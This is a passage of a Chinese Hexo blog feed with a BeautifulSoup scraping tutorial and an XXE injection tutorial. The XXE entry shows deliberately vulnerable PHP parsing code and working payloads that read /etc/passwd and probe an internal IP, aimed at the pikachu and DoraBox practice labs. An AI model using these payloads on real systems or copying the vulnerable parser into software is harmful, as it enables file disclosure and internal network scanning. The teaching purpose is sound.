id="1、bs4-基本使用"><a href="#1、bs4-基本使用" class="headerlink" title="1、bs4 基本使用"></a>1、bs4 基本使用</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span> <span class="attr">id</span>=<span class="string">&quot;b1&quot;</span> <span class="attr">title</span>=<span class="string">&quot;a1&quot;</span> <span class="attr">class</span>=<span class="string">&quot;l1&quot;</span>&gt;</span>张三<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span>李四<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span>王五<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span>赵六<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span>钱七<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span>&gt;</span>哈哈哈<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span>&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">soup = BeautifulSoup(<span class="built_in">open</span>(<span class="string">&#x27;06_解析_bs4之基本使用.html&#x27;</span>,encoding=<span class="string">&#x27;utf8&#x27;</span>),<span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(soup)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># bs4 的一些函数</span></span><br><span class="line"><span class="comment"># (1)find</span></span><br><span class="line"><span class="comment"># 返回的是第一个符合条件的数据</span></span><br><span class="line"><span class="comment"># print(soup.find(&#x27;div&#x27;))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据标签的值来找对应的标签对象</span></span><br><span class="line"><span class="comment"># print(soup.find(&#x27;li&#x27;,title=&#x27;a1&#x27;))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据class标签来找到对应的标签对象</span></span><br><span class="line"><span class="comment"># class 不能直接用,要用 class_</span></span><br><span class="line"><span class="comment"># print(soup.find(&#x27;li&#x27;,class_=&#x27;l1&#x27;))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># (2)find_all</span></span><br><span class="line"><span class="comment"># 找到所有标签的数据 返回的值是列表类型</span></span><br><span class="line"><span class="comment"># print(soup.find_all(&#x27;li&#x27;))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 多个标签查询要加中括号[]</span></span><br><span class="line"><span class="comment"># print(soup.find_all([&#x27;li&#x27;,&#x27;span&#x27;]))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># limit 的作用是查找前几个</span></span><br><span class="line"><span class="comment"># print(soup.find_all(&#x27;li&#x27;,limit=2))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># (3)select</span></span><br><span class="line"><span class="comment"># 返回多个数据 返回的是列表类型</span></span><br><span class="line"><span class="comment"># print(soup.select(&#x27;li&#x27;))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 可以通过 . 表示class 这种操作称为类选择器</span></span><br><span class="line"><span class="comment"># print(soup.select(&#x27;.l1&#x27;))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 可以通过 # 代表id</span></span><br><span class="line"><span class="comment"># print(soup.select(&#x27;#b1&#x27;))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 属性选择器</span></span><br><span class="line"><span class="comment"># 查找li标签中含有id的标签</span></span><br><span class="line"><span class="comment"># print(soup.select(&#x27;li[id]&#x27;))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查找指定id标签</span></span><br><span class="line"><span class="comment"># print(soup.select(&#x27;li[id=&quot;b1&quot;]&#x27;))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 层级选择器</span></span><br><span class="line"><span class="comment"># 后代选择器</span></span><br><span class="line"><span class="comment"># print(soup.select(&#x27;div li&#x27;))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 子代选择器</span></span><br><span class="line"><span class="comment"># print(soup.select(&#x27;div &gt; ul &gt;li&#x27;))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询多个标签数据</span></span><br><span class="line"><span class="comment"># print(soup.select(&#x27;li,span&#x27;))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 节点信息</span></span><br><span class="line"><span class="comment"># obj = soup.select(&#x27;#b1&#x27;)[0]</span></span><br><span class="line"><span class="comment"># print(obj.string)</span></span><br><span class="line"><span class="comment"># print(obj.get_text())</span></span><br><span class="line"><span class="comment"># 如果标签对象中 只有内容 那么string和get_text()都可以使用</span></span><br><span class="line"><span class="comment"># 如果标签对象中 除了内容还有标签 那么string就获取不到数据 而get_text()是可以获取数据的</span></span><br><span class="line"><span class="comment"># 一般情况下 推荐使用get_text()</span></span><br><span class="line"><span class="comment"># obj = soup.select(&#x27;div&#x27;)[0]</span></span><br><span class="line"><span class="comment"># print(obj.string)</span></span><br><span class="line"><span class="comment"># print(obj.get_text())</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 节点的属性</span></span><br><span class="line"><span class="comment"># name是标签的名字</span></span><br><span class="line"><span class="comment"># obj = soup.select(&#x27;#b1&#x27;)[0]</span></span><br><span class="line"><span class="comment"># print(obj.name)</span></span><br><span class="line"><span class="comment"># 将属性值作为一个字典返回</span></span><br><span class="line"><span class="comment"># print(obj.attrs)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取节点的属性</span></span><br><span class="line"><span class="comment"># print(obj.attrs.get(&#x27;class&#x27;))</span></span><br></pre></td></tr></table></figure><h5 id="2、bs4-星巴克菜单"><a href="#2、bs4-星巴克菜单" class="headerlink" title="2、bs4 星巴克菜单"></a>2、bs4 星巴克菜单</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;https://www.starbucks.com.cn/menu/&#x27;</span></span><br><span class="line"></span><br><span class="line">response = urllib.request.urlopen(url)</span><br><span class="line"></span><br><span class="line">content = response.read().decode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">soup = BeautifulSoup(content,<span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># //ul[@class=&quot;grid padded-3 product&quot;]//strong</span></span><br><span class="line">name_list = soup.select(<span class="string">&#x27;ul[class=&quot;grid padded-3 product&quot;] strong&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> name_list:</span><br><span class="line">    <span class="built_in">print</span>(name.get_text())</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;解析&lt;/p&gt;</summary>
    
    
    
    <category term="Python" scheme="http://blog.hvvl404.fun/categories/Python/"/>
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://blog.hvvl404.fun/2023/05/12/Web%E6%BC%8F%E6%B4%9E/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://blog.hvvl404.fun/2023/05/12/Web%E6%BC%8F%E6%B4%9E/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2023-05-12T12:29:54.596Z</published>
    <updated>2023-05-12T12:29:54.596Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://blog.hvvl404.fun/2023/05/12/Web%E6%BC%8F%E6%B4%9E/%E7%88%86%E7%A0%B4/"/>
    <id>http://blog.hvvl404.fun/2023/05/12/Web%E6%BC%8F%E6%B4%9E/%E7%88%86%E7%A0%B4/</id>
    <published>2023-05-12T12:29:41.413Z</published>
    <updated>2023-05-12T12:29:41.413Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://blog.hvvl404.fun/2023/05/12/Web%E6%BC%8F%E6%B4%9E/PHP%E7%89%B9%E6%80%A7/"/>
    <id>http://blog.hvvl404.fun/2023/05/12/Web%E6%BC%8F%E6%B4%9E/PHP%E7%89%B9%E6%80%A7/</id>
    <published>2023-05-12T12:29:27.219Z</published>
    <updated>2023-05-12T12:29:27.219Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://blog.hvvl404.fun/2023/05/12/Web%E6%BC%8F%E6%B4%9E/NodeJS%E6%B3%A8%E5%85%A5/"/>
    <id>http://blog.hvvl404.fun/2023/05/12/Web%E6%BC%8F%E6%B4%9E/NodeJS%E6%B3%A8%E5%85%A5/</id>
    <published>2023-05-12T12:28:28.863Z</published>
    <updated>2023-05-12T12:28:28.863Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://blog.hvvl404.fun/2023/05/12/Web%E6%BC%8F%E6%B4%9E/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
    <id>http://blog.hvvl404.fun/2023/05/12/Web%E6%BC%8F%E6%B4%9E/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</id>
    <published>2023-05-12T12:28:12.945Z</published>
    <updated>2023-05-12T12:28:12.945Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://blog.hvvl404.fun/2023/05/12/Web%E6%BC%8F%E6%B4%9E/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/"/>
    <id>http://blog.hvvl404.fun/2023/05/12/Web%E6%BC%8F%E6%B4%9E/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/</id>
    <published>2023-05-12T12:27:38.664Z</published>
    <updated>2023-05-12T12:27:38.664Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>XXE外部实体注入</title>
    <link href="http://blog.hvvl404.fun/2023/05/12/Web%E6%BC%8F%E6%B4%9E/XXE%E5%86%85%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/"/>
    <id>http://blog.hvvl404.fun/2023/05/12/Web%E6%BC%8F%E6%B4%9E/XXE%E5%86%85%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/</id>
    <published>2023-05-12T12:27:17.405Z</published>
    <updated>2023-05-18T14:15:53.188Z</updated>
    
    <content type="html"><![CDATA[<p><strong>XXE外部实体注入</strong></p><span id="more"></span><h2 id="一、何谓XXE"><a href="#一、何谓XXE" class="headerlink" title="一、何谓XXE"></a>一、何谓XXE</h2><p>XXE（XML External Entity Injection）也就是XML外部实体注入，XXE漏洞发生在应用程序解析XML输入时，XML文件的解析依赖libxml库，而libxml2.9以前的版本默认支持并开启了对外部实体的引用，服务器端解析用户提交的XML文件时，未对XML文件引用的外部实体（含外部一般实体和外部参数实体）做合适的处理，并且实体的URL支持file:&#x2F;&#x2F;和ftp:&#x2F;&#x2F;等协议，导致可加载恶意外部文件和代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起DOS攻击等危害。</p><br><h2 id="二、XML文档结构"><a href="#二、XML文档结构" class="headerlink" title="二、XML文档结构"></a>二、XML文档结构</h2><p><strong>1、XML语法规则</strong></p><p>（1）XML文档必须有一个根元素</p><p>（2）XML元素都必须有一个关闭标签</p><p>（3）XML标签对大小写敏感</p><p>（4）XML元素必须被正确的嵌套</p><p>（5）XML属性值必须加引号</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE -------------------&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">class</span> <span class="attr">id</span>=<span class="string">&quot;abc&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">student</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span>&gt;</span>01<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>张三<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">sex</span>&gt;</span>男<span class="tag">&lt;/<span class="name">sex</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">age</span>&gt;</span>18<span class="tag">&lt;/<span class="name">age</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">degree</span>&gt;</span>本科<span class="tag">&lt;/<span class="name">degree</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">school</span>&gt;</span>闽南师范大学<span class="tag">&lt;/<span class="name">school</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">student</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">student</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span>&gt;</span>02<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>李四<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">sex</span>&gt;</span>男<span class="tag">&lt;/<span class="name">sex</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">age</span>&gt;</span>19<span class="tag">&lt;/<span class="name">age</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">degree</span>&gt;</span>专科<span class="tag">&lt;/<span class="name">degree</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">school</span>&gt;</span>漳州职业技术学院<span class="tag">&lt;/<span class="name">school</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">student</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>2、DTD（document type definition）</strong></p><p>XML文档结构包括XML声明、DTD文档类型定义、文档元素。而DTD就是用来控制文档的一个格式规范的。</p><p>PCDATA 的意思就是被解析的字符数据，PODATA 是会被解析器解析的文本</p><p><strong>3、内部实体引用</strong></p><p>其实除了在DTD中定义元素以外，我们还可以咋子DTD中定义实体（相当于一个变量），我们可以在XML中通过“&amp;”符号进行引用</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;ISO-8819-1&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="keyword">name</span> <span class="keyword">ANY</span>&gt;</span>         # 定义元素为ANY表示接受任何元素</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="keyword">xxe</span> <span class="string">&quot;test&quot;</span>&gt;</span>       # 定义一个实体xxe，值为test字符</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><p>在XML元素中进行内部实体引，进而实现变量替换</p><p><strong>4、外部实体引用</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">updateprofile</span> [<span class="meta">&lt;!ENTITY <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">updateprofile</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filename</span>&gt;</span>abc<span class="tag">&lt;/<span class="name">filename</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">lastname</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">lastname</span>&gt;</span></span><br><span class="line">    ...</span><br><span class="line"><span class="tag">&lt;/<span class="name">updateprofile</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>5、外部引用</strong></p><p>格式：<!DOCTYPE 根元素 SYSTEM "文件名"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 如下DTD定义引用自外部文件 note.dtd</span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;node.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">node</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">to</span>&gt;</span>zhangsan<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">from</span>&gt;</span>cn<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">heading</span>&gt;</span>reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">node</span>&gt;</span></span><br><span class="line"># 外部文件 node.dtd 的内容为：</span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">to</span>,<span class="keyword">from</span>,<span class="keyword">heading</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">to</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">from</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">heading</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span><br></pre></td></tr></table></figure><br><h2 id="三、漏洞利用"><a href="#三、漏洞利用" class="headerlink" title="三、漏洞利用"></a>三、漏洞利用</h2><p><strong>1、准备PHP代码</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$xml = file_get_contents(&quot;php://input&quot;);    // 直接使用伪协议读取POST请求的全部内容</span><br><span class="line">$data = simplexml_load_string($xml,&#x27;SimpleXMLElement&#x27;,LIBXML_NOENT);    //此过程会对XML进行解析</span><br><span class="line">echo $data;</span><br></pre></td></tr></table></figure><p><strong>2、在浏览器中发送POST请求</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [ <span class="meta">&lt;!ENTITY <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span> ] &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">node</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">node</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上述PHP代码中，并没有使用$_POST[‘arg’]去获取请求的内容，而是使用PHP伪协议 php:&#x2F;&#x2F;input，所以不需要指定参数名如果使用$_POST[‘arg’]去读取前端的XML内容，也是没有问题的指定arg&#x3D;xml即可，但是需要将xml内容进行URL转码</p><p><strong>3、试试端口扫描</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [ <span class="meta">&lt;!ENTITY <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://192.168.254.134&quot;</span>&gt;</span> ] &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">node</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">node</span>&gt;</span></span><br></pre></td></tr></table></figure><p>既然可以端口扫描，当然也可以实现内网扫描、资产探测、DOS攻击等操作</p><br><h2 id="四、靶场环境下的XXE"><a href="#四、靶场环境下的XXE" class="headerlink" title="四、靶场环境下的XXE"></a>四、靶场环境下的XXE</h2><h3 id="1、pikachu"><a href="#1、pikachu" class="headerlink" title="1、pikachu"></a>1、pikachu</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version-=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY f <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;f;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2、dorabox"><a href="#2、dorabox" class="headerlink" title="2、dorabox"></a>2、dorabox</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">Mikasa</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">hellworld</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;hellword;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>Mikasa<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;strong&gt;XXE外部实体注入&lt;/strong&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Web漏洞" scheme="http://blog.hvvl404.fun/categories/Web%E6%BC%8F%E6%B4%9E/"/>
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://blog.hvvl404.fun/2023/05/12/Web%E6%BC%8F%E6%B4%9E/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <id>http://blog.hvvl404.fun/2023/05/12/Web%E6%BC%8F%E6%B4%9E/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</id>
    <published>2023-05-12T12:26:39.967Z</published>
    <updated>2023-05-12T12:26:39.967Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://blog.hvvl404.fun/2023/05/12/Web%E6%BC%8F%E6%B4%9E/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <id>http://blog.hvvl404.fun/2023/05/12/Web%E6%BC%8F%E6%B4%9E/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</id>
    <published>2023-05-12T12:26:08.997Z</published>
    <updated>2023-05-12T12:26:08.997Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://blog.hvvl404.fun/2023/05/12/Web%E6%BC%8F%E6%B4%9E/SSRF%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/"/>
